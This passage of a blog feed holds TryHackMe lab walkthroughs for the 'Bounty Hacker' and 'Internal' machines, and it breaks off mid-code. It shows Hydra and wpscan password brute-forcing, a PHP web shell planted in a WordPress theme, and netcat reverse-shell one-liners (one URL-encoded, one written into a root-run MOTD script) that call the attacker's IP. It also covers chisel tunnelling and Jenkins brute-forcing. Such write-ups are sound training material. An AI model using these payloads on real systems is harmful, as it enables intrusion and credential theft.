[ATTEMPT] target 10.10.56.222 - login \u0026#34;you\u0026#34; - pass \u0026#34;ReddRA60N\u0026#34; - 5 of 1898 [child 4] (0/0) [ATTEMPT] target 10.10.56.222 - login \u0026#34;you\u0026#34; - pass \u0026#34;R3dDrag0nSynd1c4te\u0026#34; - 6 of 1898 [child 5] (0/0) ...   That didn\u0026rsquo;t work, let\u0026rsquo;s continue to the other combination of lists.\n Bruteforce using rocks.txt list against rocks.txt\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  ┌──(root💀b0x)-[/mnt/hgfs/THM/Bounty Hacker] └─# grc hydra -L locks.txt -P locks.txt 10.10.56.222 -s 22 ssh -vV -I  Hydra v9.1 (c) 2020 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-09 00:21:54 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 16 tasks per 1 server, overall 16 tasks, 676 login tries (l:26/p:26), ~43 tries per task [DATA] attacking ssh://10.10.56.222:22/ [VERBOSE] Resolving addresses ... [VERBOSE] resolving done [INFO] Testing if password authentication is supported by ssh://rEddrAGON@10.10.56.222:22 [INFO] Successful, password authentication is supported by ssh://10.10.56.222:22 [ATTEMPT] target 10.10.56.222 - login \u0026#34;rEddrAGON\u0026#34; - pass \u0026#34;rEddrAGON\u0026#34; - 1 of 676 [child 0] (0/0) [ATTEMPT] target 10.10.56.222 - login \u0026#34;rEddrAGON\u0026#34; - pass \u0026#34;ReDdr4g0nSynd!cat3\u0026#34; - 2 of 676 [child 1] (0/0) [ATTEMPT] target 10.10.56.222 - login \u0026#34;rEddrAGON\u0026#34; - pass \u0026#34;Dr@gOn$yn9icat3\u0026#34; - 3 of 676 [child 2] (0/0) [ATTEMPT] target 10.10.56.222 - login \u0026#34;rEddrAGON\u0026#34; - pass \u0026#34;R3DDr46ONSYndIC@Te\u0026#34; - 4 of 676 [child 3] (0/0) ....   Scan went on and nothing!\n—\nNow we need to go back to our findings, since, we aren\u0026rsquo;t able to move forward with these. Relooking at the file task.txt, we can see that it also has an username in it.\n1 2 3 4 5 6  ┌──(root💀b0x)-[/mnt/hgfs/THM/Bounty Hacker] └─# cat task.txt 1.) Protect Vicious. 2.) Plan for Red Eye pickup on the moon. -lin   See that lin signature/name in the end? Let\u0026rsquo;s try that with the list rocks.txt against the host.\nExploitation 1 2 3 4 5 6 7 8 9 10  ┌──(root💀b0x)-[/mnt/hgfs/THM/Bounty Hacker] └─# hydra -l lin -P locks.txt 10.10.56.222 -s 22 ssh -t 4 -I 130 ⨯ Hydra v9.1 (c) 2020 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-09 00:29:38 [DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task [DATA] attacking ssh://10.10.56.222:22/ [22][ssh] host: 10.10.56.222 login: lin password: RedDr4gonSynd1cat3 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-09 00:29:50   —\nThat worked!\nlin:RedDr4gonSynd1cat3\n—\nLet\u0026rsquo;s SSH into the host and grab the user.txt flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  ┌──(root💀b0x)-[/mnt/hgfs/THM/Bounty Hacker] └─# ssh lin@10.10.56.222  The authenticity of host \u0026#39;10.10.56.222 (10.10.56.222)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:fzjl1gnXyEZI9px29GF/tJr+u8o9i88XXfjggSbAgbE. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.56.222\u0026#39; (ECDSA) to the list of known hosts. lin@10.10.56.222\u0026#39;s password:  Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 83 packages can be updated. 0 updates are security updates. Last login: Sun Jun 7 22:23:41 2020 from 192.168.0.14 lin@bountyhacker:~/Desktop$ lin@bountyhacker:~/Desktop$ id uid=1001(lin) gid=1001(lin) groups=1001(lin) lin@bountyhacker:~/Desktop$ lin@bountyhacker:~/Desktop$ wc -c user.txt 21 user.txt   We\u0026rsquo;re inside! 💀 —\nSubmitted flag and I just realized that I should have taken a look at hints to save some of the time wasted in using bogus lists! 😖\nOh well, can\u0026rsquo;t reverse time 🙏\nPrivileges Escalation Let\u0026rsquo;s run [linpeas.sh](http://linpeas.sh)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  lin@bountyhacker:~$ wget http://10.17.0.120/linpeas.sh \u0026amp;\u0026amp; chmod +x linpeas.sh --2021-04-08 14:34:29-- http://10.17.0.120/linpeas.sh Connecting to 10.17.0.120:80... connected. HTTP request sent, awaiting response... 200 OK Length: 328992 (321K) [text/x-sh] Saving to: ‘linpeas.sh’ linpeas.sh 100%[=====================================================================================================================\u0026gt;] 321.28K 262KB/s in 1.2s 2021-04-08 14:34:31 (262 KB/s) - ‘linpeas.sh’ saved [328992/328992] lin@bountyhacker:~$ lin@bountyhacker:~$ ./linpeas.sh   Let\u0026rsquo;s go through the interesting things.\n1 2 3 4 5 6 7 8 9 10 11 12  [+] Interesting Firefox Files [i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox  Found /home/lin/.mozilla /home/lin/.mozilla/firefox/o0cm87l0.default-release/addons.json /home/lin/.mozilla/firefox/o0cm87l0.default-release/bookmarkbackups /home/lin/.mozilla/firefox/o0cm87l0.default-release/cookies.sqlite /home/lin/.mozilla/firefox/o0cm87l0.default-release/favicons.sqlite /home/lin/.mozilla/firefox/o0cm87l0.default-release/formhistory.sqlite /home/lin/.mozilla/firefox/o0cm87l0.default-release/handlers.json /home/lin/.mozilla/firefox/o0cm87l0.default-release/key4.db /home/lin/.mozilla/firefox/o0cm87l0.default-release/places.sqlite /home/lin/.mozilla/firefox/o0cm87l0.default-release/prefs.js   Can we use firefox\u0026rsquo;s credentials db for passwords? Let\u0026rsquo;s check all in the end.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  [+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500) [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files  /dev/mqueue /dev/shm /etc/update-motd.d/00-header /home/lin /run/lock /run/user/1001 /run/user/1001/systemd /tmp /tmp/.font-unix /tmp/.ICE-unix /tmp/.Test-unix /tmp/.X11-unix /tmp/.XIM-unix /var/crash /var/lib/lightdm-data/lin /var/metrics /var/tmp   /etc/update-motd.d/00-header is writeable? really? Noice! We can edit this and SSH again as our user to execute this and get reverse shell!\n1 2  lin@bountyhacker:~$ ls -la /etc/update-motd.d/00-header -rwxr-xrwx 1 root root 1221 Jun 7 2020 /etc/update-motd.d/00-header   It is indded writeable! Let\u0026rsquo;s add reverse shell one liner in the file right after shebang #!/bin/sh\n1 2  lin@bountyhacker:~$ which nc /bin/nc   Let\u0026rsquo;s use the following for reverses shell on port 5555 of our host.\n1  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.17.0.120 5555 \u0026gt;/tmp/f   After adding reverse shell one-liner to the file, it looks like:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  #!/bin/sh  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.17.0.120 5555 \u0026gt;/tmp/f # # 00-header - create the header of the MOTD # Copyright (C) 2009-2010 Canonical Ltd. # # Authors: Dustin Kirkland \u0026lt;kirkland@canonical.com\u0026gt; # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License along # with this program; if not, write to the Free Software Foundation, Inc., # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. [ -r /etc/lsb-release ] \u0026amp;\u0026amp; . /etc/lsb-release if [ -z \u0026#34;$DISTRIB_DESCRIPTION\u0026#34; ] \u0026amp;\u0026amp; [ -x /usr/bin/lsb_release ]; then # Fall back to using the very slow lsb_release utility DISTRIB_DESCRIPTION=$(lsb_release -s -d) fi printf \u0026#34;Welcome to %s (%s %s %s)\\n\u0026#34; \u0026#34;$DISTRIB_DESCRIPTION\u0026#34; \u0026#34;$(uname -o)\u0026#34; \u0026#34;$(uname -r)\u0026#34; \u0026#34;$(uname -m)\u0026#34;   Can see our one-liner in the second line, let\u0026rsquo;s save this and do SSH again as the user lin. Remember to start listener on port 5555 beforehand!\nRoot shell! Alright, that was an easy machine but we wasted more than necessary time (i.e. 30 minutes on an easy machine).\nHopefully, you enjoyed the writeup! 😇\nThings learnt (and not todos):  Always check the files we already have for username/passwords Don\u0026rsquo;t waste unnecessary time with long lists bruteforcing against slow protocols  ","description":"Walkthrough of the machine Bounty Hacker on TryHackMe - https://tryhackme.com/room/cowboyhacker","id":1,"section":"posts","tags":["tryhackme","nmap","ftp","ssh","http","gobuster","cewl","hydra","bruteforcing","privesc"],"title":"TryHackMe - Bounty Hacker","uri":"https://umar0x01.sh/posts/bounty-hacker-thm/"},{"content":"Enumeration IP: 10.10.25.58\nHost: internal.thm\nLet\u0026rsquo;s start with the nmap full port scan and see the open ports\nNmap full port scan 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  ┌──(root💀b0x)-[/mnt/hgfs/THM/Internal] [7/117] └─# nmap -p- -v -iL ip -oN nmapFullPort.nmap Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-07 13:15 PKT Initiating Ping Scan at 13:15 Scanning 10.10.25.58 [4 ports] Completed Ping Scan at 13:15, 0.22s elapsed (1 total hosts) Initiating SYN Stealth Scan at 13:15 Scanning internal.thm (10.10.25.58) [65535 ports] Discovered open port 80/tcp on 10.10.25.58 Discovered open port 22/tcp on 10.10.25.58 SYN Stealth Scan Timing: About 96.47% done; ETC: 13:34 (0:00:40 remaining) Completed SYN Stealth Scan at 13:35, 1181.13s elapsed (65535 total ports) Nmap scan report for internal.thm (10.10.25.58) Host is up (0.19s latency). Not shown: 65533 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 1181.51 seconds Raw packets sent: 74888 (3.295MB) | Rcvd: 110353 (9.720MB)   Enumerating HTTP Web Server (Port 80) Taking a look at port 80, we can see that / points to Apache\u0026rsquo;s default page. Let\u0026rsquo;s try running gobuster against the web server:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  ┌──(root💀b0x)-[/mnt/hgfs/THM/Internal] └─# gobuster dir -u http://10.10.245.7 -w /usr/share/wordlists/dirb/big.txt -k -e -b 404 -t 100 1 ⨯ =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.245.7 [+] Method: GET [+] Threads: 100 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/04/07 13:05:27 Starting gobuster in directory enumeration mode =============================================================== http://10.10.245.7/.htpasswd (Status: 403) [Size: 276] http://10.10.245.7/.htaccess (Status: 403) [Size: 276] http://10.10.245.7/blog (Status: 301) [Size: 309] [--\u0026gt; http://10.10.245.7/blog/] http://10.10.245.7/javascript (Status: 301) [Size: 315] [--\u0026gt; http://10.10.245.7/javascript/] http://10.10.245.7/phpmyadmin (Status: 301) [Size: 315] [--\u0026gt; http://10.10.245.7/phpmyadmin/] http://10.10.245.7/server-status (Status: 403) [Size: 276] http://10.10.245.7/wordpress (Status: 301) [Size: 314] [--\u0026gt; http://10.10.245.7/wordpress/]  =============================================================== 2021/04/07 13:06:13 Finished ===============================================================   \u0026ndash;\nVisiting /blog/ we can find that it\u0026rsquo;s hosting wordpress. Let\u0026rsquo;s run wpscan and see what we can enumerate.\nWpScan (/blog/) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94  ┌──(root💀b0x)-[/mnt/hgfs/THM/Internal] └─# wpscan --url http://internal.thm/blog/ -e u _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.17 Sponsored by Automattic - https://automattic.com/  @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://internal.thm/blog/ [10.10.25.58] [+] Started: Wed Apr 7 14:17:35 2021 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php  | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API  | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/  | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/  | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/  | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://internal.thm/blog/readme.html  | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php  | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos  | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10). | Found By: Rss Generator (Passive Detection) | - http://internal.thm/blog/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.2\u0026lt;/generator\u0026gt;  | - http://internal.thm/blog/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.2\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentyseventeen | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/  | Last Updated: 2021-03-09T00:00:00.000Z | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt  | [!] The version is out of date, the latest version is 2.6 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507  | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/  | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/  | | Found By: Css Style In Homepage (Passive Detection) | | Version: 2.3 (80% confidence) | Found By: Style (Passive Detection) | - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: \u0026#39;Version: 2.3\u0026#39; [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:00 \u0026lt;=====================================================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:00 [i] User(s) Identified: [+] admin | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1  | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Wed Apr 7 14:17:39 2021 [+] Requests Done: 13 [+] Cached Requests: 48 [+] Data Sent: 3.457 KB [+] Data Received: 9.149 KB [+] Memory used: 167 MB [+] Elapsed time: 00:00:03   We can see that admin user exists in the application. Let\u0026rsquo;s use rockyou.txt wordlist for bruteforcing.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108  ┌──(root💀b0x)-[/mnt/hgfs/THM/Internal] [475/528] └─# wpscan --url http://internal.thm/blog/ -v -e u -P /usr/share/wordlists/rockyou.txt -t 500 2 ⨯ _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.17 Sponsored by Automattic - https://automattic.com/  @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://internal.thm/blog/ [10.10.25.58] [+] Started: Wed Apr 7 14:09:25 2021 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php  | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API  | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/  | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/  | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/  | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://internal.thm/blog/readme.html  | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php  | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos  | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10). | Found By: Rss Generator (Passive Detection) | - http://internal.thm/blog/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.2\u0026lt;/generator\u0026gt; [426/528]  | - http://internal.thm/blog/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.2\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentyseventeen | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/  | Last Updated: 2021-03-09T00:00:00.000Z | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt  | [!] The version is out of date, the latest version is 2.6 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507  | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/  | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a focus on business sites, it features multiple sections on the front page as well as widgets, navi gation and social menus, a logo, and more. Personalize its asymmetrical grid with a custom color scheme and showcase your multimedia content with post formats. Our default theme for 2017 works great in many lang uages, for any abilities, and on any device. | Author: the WordPress team | Author URI: https://wordpress.org/  | License: GNU General Public License v2 or later | License URI: http://www.gnu.org/licenses/gpl-2.0.html  | Tags: one-column, two-columns, right-sidebar, flexible-header, accessibility-ready, custom-colors, custom-header, custom-menu, custom-logo, editor-style, featured-images, footer-widgets, post-formats, rtl-lan guage-support, sticky-post, theme-options, threaded-comments, translation-ready | Text Domain: twentyseventeen | | Found By: Css Style In Homepage (Passive Detection) | | Version: 2.3 (80% confidence) | Found By: Style (Passive Detection) | - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: \u0026#39;Version: 2.3\u0026#39; [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:04 \u0026lt;=====================================================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:04 [i] User(s) Identified: [+] admin | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1  | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] Performing password attack on Xmlrpc against 1 user/s [SUCCESS] - admin / ... Trying admin / timmy1 Time: 00:01:35 \u0026lt; \u0026gt; (4000 / 14348392) 0.02% ETA: ??:??:?? [!] Valid Combinations Found: | Username: admin, Password: ... [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Wed Apr 7 14:11:21 2021 [+] Requests Done: 4056 [+] Cached Requests: 7 [+] Data Sent: 2.022 MB [+] Data Received: 2.759 MB [+] Memory used: 186.539 MB [+] Elapsed time: 00:01:55   Got hit around 4000 tries, we get credentials of the user admin\nadmin:...\nExploitation Let\u0026rsquo;s now try and login and get reverse shell on our machine. I\u0026rsquo;ll be editing the theme file (404.php) and add the following for rce:\n1 2 3 4 5  \u0026lt;?php system($_GET[123]); ?\u0026gt;  Added the snippet for getting RCE\nNow, we need to visit a 404 page on the application to get RCE! We do so by finding a legit blog post and just changing the URL.\nRCE Reverse Shell time! Alright, time to get reverse shell, let\u0026rsquo;s see if we\u0026rsquo;ve nc on the host. Can do so by using which\n1  which nc   Alright, nc exists. We can utilize the following to get reverse shell:\n1  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.17.0.120 4444 \u0026gt;/tmp/f   Let\u0026rsquo;s URL encode it before using, since due to \u0026amp; the payload might not execute. We can use cyberchef for doing so.\nRemember to encode all special characters as well!\n1  rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20%2Di%202%3E%261%7Cnc%2010%2E17%2E0%2E120%204444%20%3E%2Ftmp%2Ff   Let\u0026rsquo;s get RCE now, first start listener on local 4444 port.\n1  http://internal.thm/blog/index.php/2020/08/04/hello-world/?123=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20%2Di%202%3E%261%7Cnc%2010%2E17%2E0%2E120%204444%20%3E%2Ftmp%2Ff   Got reverse shell! Beautified and made it interactive as well.\nPrivileges Escalation Alright, we got shell as www-data user and can\u0026rsquo;t really find any flags. Also, there\u0026rsquo;s a user in /home/aubreanna\nLooking at the processes we can see that it has one java service running:\n1 2 3 4 5  www-data@internal:/var/www/html/wordpress$ ps aux | grep aubrean aubrean+ 1540 0.0 0.0 1148 4 ? Ss 09:07 0:00 /sbin/tini -- /usr/local/bin/jenkins.sh aubrean+ 1574 1.7 12.0 2587808 245668 ? Sl 09:07 0:23 java -Duser.home=/var/jenkins_home -Djenkins.model.Jenkins.slaveAgentPort=50000 -jar /usr/share/jenkins/jenkins.war aubrean+ 1612 0.0 0.0 0 0 ? Z 09:07 0:00 [jenkins.sh] \u0026lt;defunct\u0026gt; www-data 5586 0.0 0.0 11464 1100 pts/0 S+ 09:29 0:00 grep --color=auto aubrean   Let\u0026rsquo;s see the local listening ports:\n1 2 3 4 5 6 7 8 9 10 11 12 13  www-data@internal:/var/www/html/wordpress$ netstat -plnt (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:33897 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN -   Port 8080 is listening locally, let\u0026rsquo;s try and cURL and see the repsonse it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  www-data@internal:/var/www/html/wordpress$ curl -i http://127.0.0.1:8080 HTTP/1.1 403 Forbidden Date: Wed, 07 Apr 2021 09:30:54 GMT X-Content-Type-Options: nosniff Set-Cookie: JSESSIONID.992b29b3=node01ii80j993afao35bpvwstyvpu0.node0; Path=/; HttpOnly Expires: Thu, 01 Jan 1970 00:00:00 GMT Content-Type: text/html;charset=utf-8 X-Hudson: 1.395 X-Jenkins: 2.250 X-Jenkins-Session: 56d53c37 X-Hudson-CLI-Port: 50000 X-Jenkins-CLI-Port: 50000 X-Jenkins-CLI2-Port: 50000 X-You-Are-Authenticated-As: anonymous X-You-Are-In-Group-Disabled: JENKINS-39402: use -Dhudson.security.AccessDeniedException2.REPORT_GROUP_HEADERS=true or use /whoAmI to diagnose X-Required-Permission: hudson.model.Hudson.Read X-Permission-Implied-By: hudson.security.Permission.GenericRead X-Permission-Implied-By: hudson.model.Hudson.Administer Content-Length: 793 Server: Jetty(9.4.30.v20200611) \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;meta http-equiv=\u0026#39;refresh\u0026#39; content=\u0026#39;1;url=/login?from=%2F\u0026#39;/\u0026gt;\u0026lt;script\u0026gt;window.location.replace(\u0026#39;/login?from=%2F\u0026#39;);\u0026lt;/script\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body style=\u0026#39;background-color:white; color:white;\u0026#39;\u0026gt; Authentication required \u0026lt;!-- You are authenticated as: anonymous Groups that you are in: Permission you need to have (but didn\u0026#39;t): hudson.model.Hudson.Read ... which is implied by: hudson.security.Permission.GenericRead ... which is implied by: hudson.model.Hudson.Administer --\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;   \u0026ndash;\nPort Forwarding (8080) Interesting, let\u0026rsquo;s try and do port forwarding utilziing chisel and access the port locally on our own attacker machine.\nWe can do so by doing the following on attacker/victim machines:\nVictim:\n1 2 3  www-data@internal:/tmp$ ./chisel-umar0x01 server -p 47000 2021/04/07 09:34:08 server: Fingerprint auG3MXyqO68Dyisj38bk+g/QRvnlc/xVxcjh/ulpye4= 2021/04/07 09:34:08 server: Listening on http://0.0.0.0:47000   Attacker:\n1 2 3 4 5  ┌──(root💀b0x)-[/var/www/html] └─# ./chisel-umar0x01 client 10.10.25.58:47000 2222:127.0.0.1:8080 127 ⨯ 2021/04/07 14:35:23 client: Connecting to ws://10.10.25.58:47000 2021/04/07 14:35:23 client: tun: proxy#2222=\u0026gt;8080: Listening 2021/04/07 14:35:24 client: Connected (Latency 187.684044ms)   \u0026ndash;\nWe got the connection:\nNow, let\u0026rsquo;s connect to the localhost port 2222 and see if we can access the forwarded port.\nAlright, the port was hosting jenkins!\nAgain the login form! :|\nLet\u0026rsquo;s run hydra for jenkins bruteforcing!\n1 2 3 4 5 6 7 8 9 10 11 12 13  ┌──(root💀b0x)-[/mnt/hgfs/THM/Internal] └─# hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 2222 http-post-form \u0026#39;/j_acegi_security_check:j_username=^USER^\u0026amp;j_password=^PASS^\u0026amp;from=%2F\u0026amp;Submit=Sign+in:F=Invalid\u0026#39; -I 130 ⨯ Hydra v9.1 (c) 2020 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-07 15:05:14 [INFO] Using HTTP Proxy: http://127.0.0.1:8080 [WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking http-post-form://127.0.0.1:2222/j_acegi_security_check:j_username=^USER^\u0026amp;j_password=^PASS^\u0026amp;from=%2F\u0026amp;Submit=Sign+in:F=Invalid [2222][http-post-form] host: 127.0.0.1 login: admin password: ... 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-07 15:05:40   http://127.0.0.1:2222/script\nadmin:...\nGetting code execution on Jenkins, we know that it supports groovy script execution.\n1 2 3 4  def command = \u0026#34;cat 